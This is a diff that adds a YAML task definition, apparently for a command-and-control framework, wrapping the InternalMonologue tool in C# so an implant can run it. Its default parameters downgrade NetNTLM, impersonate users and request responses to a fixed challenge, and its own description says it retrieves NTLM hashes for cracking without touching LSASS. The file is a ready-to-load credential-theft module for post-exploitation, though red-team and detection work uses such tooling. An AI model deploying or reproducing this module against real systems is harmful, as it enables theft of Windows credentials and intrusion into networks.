@@ -1,0 +1,121 @@
+- Name: InternalMonologue
+  Aliases: []
+  Author:
+    Name: 'Simone Salucci, Daniel López & Sergio Lázaro'
+    Handle: '@saim1z, @attl4s, @Slazar0'
+    Link: ''
+  Description: Internal Monologue downgrades NetNTLM and invokes a local procedure call to the NTLM authentication package (MSV1_0) with a specific challenge. The responses obtained can be cracked using rainbow tables.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using InternalMonologue;
+    using InternalMonologue.StringExtensions;
+    
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+        public static string Execute(string Parameters)
+        {
+            string output = "";
+            try
+            {
+                TextWriter realStdOut = Console.Out;
+                TextWriter realStdErr = Console.Error;
+                TextWriter stdOutWriter = new StreamWriter(OutputStream);
+                TextWriter stdErrWriter = new StreamWriter(OutputStream);
+                Console.SetOut(stdOutWriter);
+                Console.SetError(stdErrWriter);
+                
+                String[] args = Parameters.Split(' ');
+                    
+                try
+                {            
+                    Program.Main(args);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("\r\n[!] Unhandled InternalMonlogue exception:\r\n");
+                    Console.WriteLine(e);
+                }
+                
+                Console.Out.Flush();
+                Console.Error.Flush();
+                Console.SetOut(realStdOut);
+                Console.SetError(realStdErr);
+                OutputStream.Close();
+            }
+            catch (Exception e) { output += e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+            return output;
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Parameters
+    Value: ''
+    DefaultValue: -Downgrade True -Restore True -Impersonate True -Thread False -Verbose False -Challenge 1122334455667788
+    Description: The command-line parameters to pass to the tool.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: InternalMonologue
+    Description: Internal Monologue is a tool to retrieve NTLM hashes without touching LSASS.
+    Location: InternalMonologue\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Data.DataSetExtensions.dll
+      Location: net40\System.Data.DataSetExtensions.dll
+      DotNetVersion: Net40
+    - Name: System.Data.dll
+      Location: net40\System.Data.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Security.dll
+      Location: net40\System.Security.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Data.dll
+      Location: net35\System.Data.dll
+      DotNetVersion: Net35
+    - Name: System.Data.DataSetExtensions.dll
+      Location: net35\System.Data.DataSetExtensions.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Security.dll
+      Location: net35\System.Security.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
